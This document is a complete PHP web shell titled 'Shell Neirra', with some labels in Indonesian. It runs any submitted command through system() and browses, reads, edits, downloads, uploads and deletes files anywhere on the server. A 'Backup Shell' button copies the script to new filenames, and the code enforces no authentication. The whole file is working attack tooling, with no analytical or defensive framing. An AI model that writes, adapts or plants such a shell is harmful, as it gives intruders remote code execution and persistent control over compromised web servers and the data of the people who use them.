<?php
function h($s) { return htmlspecialchars($s, ENT_QUOTES); }
function perms($f) { $p = fileperms($f); return substr(sprintf('%o', $p), -4); }
function owner($f) {
    $u = @posix_getpwuid(fileowner($f));
    $g = @posix_getgrgid(filegroup($f));
    return ($u ? $u['name'] : fileowner($f)) . ':' . ($g ? $g['name'] : filegroup($f));
}
function clr($f) { return is_writable($f) ? '#66bb66' : '#bb6666'; }

$d = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!$d || !is_dir($d)) $d = getcwd();
$f = isset($_GET['f']) ? $_GET['f'] : '';
$c = isset($_POST['c']) ? $_POST['c'] : '';
$a = isset($_GET['a']) ? $_GET['a'] : '';

$real_path = realpath($d);

// Handle backup
if (isset($_POST['backup_trigger'])) {
    echo "<div style='text-align:center;margin-top:10px;'><form method='post' style='display:inline-block;'>";
    echo "<input type='text' name='backup_name' placeholder='Nama File'> ";
    echo "<button type='submit' name='do_backup'>✅ OK</button></form></div>";
}
if (isset($_POST['do_backup']) && !empty($_POST['backup_name'])) {
    $src = $_SERVER['SCRIPT_FILENAME'];
    $dst = $real_path . '/' . basename($_POST['backup_name']);
    if (@copy($src, $dst)) {
        echo "<div style='color:#00e676;text-align:center;'>✔️ Backup berhasil disimpan sebagai <code>" . h(basename($dst)) . "</code></div>";
    } else {
        echo "<div style='color:#f44336;text-align:center;'>❌ Gagal melakukan backup.</div>";
    }
}

// Handle file creation
if (isset($_POST['newfile']) && !empty($_POST['newfilename'])) {
    $newfile = $real_path . '/' . basename($_POST['newfilename']);
    if (!file_exists($newfile)) {
        file_put_contents($newfile, '');
    }
}

// Handle folder creation
if (isset($_POST['newfolder']) && !empty($_POST['newfoldername'])) {
    $newfolder = $real_path . '/' . basename($_POST['newfoldername']);
    if (!file_exists($newfolder)) {
        mkdir($newfolder);
    }
}

echo "<html><head><title>Shell Neirra</title><style>
body{background:#111;color:#ccc;font-family:monospace;font-size:13px;padding:10px}
a{color:#88f;text-decoration:none}a:hover{text-decoration:underline}
pre{background:#222;padding:10px;border:1px solid #444;overflow:auto}
.folder{color:#ccaa33;font-weight:bold}.file{color:#aaa}
.download,.delete{color:#448844;text-decoration:none}
.download:hover,.delete:hover{color:#66bb66}
.scroll-box{max-height:400px;overflow:auto;border:1px solid #444;margin-bottom:1em}
table{width:100%;border-collapse:collapse;min-width:800px}
th,td{border:1px solid #444;padding:4px 6px;white-space:nowrap}
tr:hover{background:#1e1e1e}
input[type=text],textarea{background:#222;color:#ccc;border:1px solid #444;padding:5px;width:80%}
input[type=submit],input[type=file]{background:#333;color:#ccc;border:1px solid #666;padding:4px 10px}
</style></head><body>";

// Breadcrumb
echo "<h3>📁 Path: ";
$parts = explode('/', trim($d, '/')); $build = ''; echo "<a href='?pw=$token&d=/'>/</a>";
foreach ($parts as $p){$build.="/$p";echo "/<a href='?pw=$token&d=".urlencode($build)."'>".h($p)."</a>";}
echo "</h3><hr>";

if ($a=='download' && is_file($f)) {
    header("Content-Disposition: attachment; filename=\"".basename($f)."\"");
    header("Content-Type: application/octet-stream");
    readfile($f); exit;
}

if ($f && is_file($f) && $a != 'del' && $a != 'download') {
    if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['konten'])) {
        $konten = get_magic_quotes_gpc() ? stripslashes($_POST['konten']) : $_POST['konten'];
        $s = @fopen($f, 'w');
        if ($s) { fwrite($s, $konten); fclose($s); echo "<b>✅ Saved</b><hr>"; }
        else echo "<b>❌ Cannot save!</b><hr>";
    }
    $content = h(file_get_contents($f));
    echo "<form method='POST'><b>📝 Editing:</b> ".h($f)."<br><textarea name='konten' rows='20'>".stripslashes($content)."</textarea><br><input type='submit' value='Save'></form>";
    echo "<br><a href='?pw=$token&d=".urlencode($real_path)."'>&larr; Kembali ke folder</a><hr>";
}

if ($a=='del' && $f) { if (@unlink($f)) echo "<b>✅ Deleted ".h($f)."</b><hr>"; else echo "<b>❌ Failed to delete</b><hr>"; }
if ($c) { echo "<h4>💻 Output:</h4><pre>"; system($c); echo "</pre><hr>"; }
if (isset($_FILES['upload'])) {
    $u = $real_path.'/'.basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'],$u)) echo "<b>✅ Uploaded</b><hr>";
    else echo "<b>❌ Upload failed!</b><hr>";
}

$dirs = $files = [];
if ($h = @opendir($d)) {
    while (false !== ($x = readdir($h))) {
        if ($x == '.' || $x == '..') continue;
        $p = realpath($d.'/'.$x);
        if (is_dir($p)) $dirs[] = $x;
        else $files[] = $x;
    }
    closedir($h);
}
sort($dirs); sort($files);

echo "<div class='scroll-box'><table>";
echo "<tr><th>Name</th><th>Size</th><th>Modified</th><th>Perm</th><th>Owner</th><th>Action</th></tr>";
foreach ($dirs as $x) {
    $p = realpath($d.'/'.$x); $t = date('Y-m-d H:i:s', filemtime($p));
    echo "<tr><td><a class='folder' href='?pw=$token&d=".urlencode($p)."'>[$x]</a></td><td></td><td>$t</td><td style='color:".clr($p)."'>".perms($p)."</td><td>".owner($p)."</td><td>DIR</td></tr>";
}
foreach ($files as $x) {
    $p = realpath($d.'/'.$x); $s = filesize($p); $t = date('Y-m-d H:i:s', filemtime($p));
    echo "<tr><td><a class='file' href='?pw=$token&f=".urlencode($p)."'>".h($x)."</a></td><td>$s</td><td>$t</td><td style='color:".clr($p)."'>".perms($p)."</td><td>".owner($p)."</td><td><a class='download' href='?pw=$token&f=".urlencode($p)."&a=download'>Download</a> | <a class='delete' href='?pw=$token&f=".urlencode($p)."&a=del' onclick=\"return confirm('Delete?')\">Delete</a></td></tr>";
}
echo "</table></div><hr>";

echo "<form method='POST' enctype='multipart/form-data'><b>📤 Upload File:</b><br><input type='file' name='upload'><input type='submit' value='Upload'></form><hr>";
echo "<form method='POST'><b>📄 New File:</b><br><input type='text' name='newfilename'><input type='submit' name='newfile' value='Create'></form><hr>";
echo "<form method='POST'><b>📁 New Folder:</b><br><input type='text' name='newfoldername'><input type='submit' name='newfolder' value='Create'></form><hr>";
echo "<form method='POST'><input type='submit' name='backup_trigger' value='📦 Backup Shell'></form><hr>";
echo "<form method='POST'><b>💬 Run Command:</b><br><input type='text' name='c'><input type='submit' value='Execute'></form>";

echo "</body></html>";
?>
